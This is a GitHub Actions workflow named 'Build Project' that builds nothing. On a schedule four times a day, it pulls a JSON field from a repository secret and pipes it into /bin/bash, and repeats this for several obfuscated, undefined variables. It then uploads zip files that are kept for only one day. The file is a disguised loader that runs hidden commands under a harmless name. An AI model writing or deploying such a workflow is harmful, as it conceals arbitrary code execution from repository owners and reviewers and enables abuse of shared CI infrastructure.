name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '51 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Perform
        env:
          s57: ${{ secrets.s57 }}
        run: |
          printf '%s' "$s57" | jq -r .tz25 | /bin/bash
          printf '%s' "$vv480" | jq -r .edtk044 | /bin/bash
          echo $zur78 | jq -r .av7 | /bin/bash
          echo $kvgol9 | jq -r .ghf6 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: PlnnXCvY
          path: "*.zip"
          retention-days: 1
